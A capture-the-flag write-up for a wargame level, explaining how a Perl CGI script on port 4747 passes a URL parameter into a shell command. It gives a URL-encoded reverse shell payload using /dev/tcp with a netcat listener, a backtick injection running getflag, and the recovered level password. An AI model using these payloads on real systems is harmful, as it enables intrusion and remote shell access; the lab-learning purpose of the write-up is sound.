# Level04 Writeup

## Objective
Gain access to the `flag04` user and retrieve the password for `level05`.

## Steps Taken

1. **Discovery of Perl Script**  
   In the home directory of the user, I found a Perl script (`level04.pl`) associated with a web service running on port `4747`:
   ```perl
   #!/usr/bin/perl
   # localhost:4747
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub x {
     $y = $_[0];
     print `echo $y 2>&1`;
   }
   x(param("x"));
   ```

2. **Vulnerability Identification**  
   The script reads a parameter `x` from the URL and directly injects it into a shell command:
   ```perl
   print `echo $y 2>&1`;
   ```
   This line is vulnerable to **command injection**, allowing arbitrary code execution by injecting shell commands into the parameter.

3. **Exploit Option 1: Reverse Shell (Used)**  
   I set up a listener on my host machine (host IP for NAT gateway: `10.0.2.2`) on port `5555`:
   ```bash
   nc -lvnp 5555
   ```
   Then, from the guest machine, I triggered a reverse shell using a URL-encoded payload:
   ```bash
   curl "http://localhost:4747/?x=%24%28bash+-c+'bash+-i+%3E%26+/dev/tcp/10.0.2.2/5555+0%3E%261'%29"
   ```
   This gave me an interactive shell on my host, connected as the `flag04` user inside the VM.

4. **Exploit Option 2: Direct Flag Retrieval**  
   Alternatively, I could have used a simpler payload to directly retrieve the flag:
   ```bash
   curl 'http://localhost:4747/level04.pl?x=`getflag`'
   ```
   This executes the `getflag` command and returns the output in the HTTP response.

5. **Retrieve the Flag**  
   With shell access as `flag04`, I executed:
   ```bash
   getflag
   ```
   This returned the flag for the next level:
   ```
   ne2searoevaevoem4ov4ar8ap
   ```

## Result
Successfully retrieved the password for `level05`:  
```
ne2searoevaevoem4ov4ar8ap
```
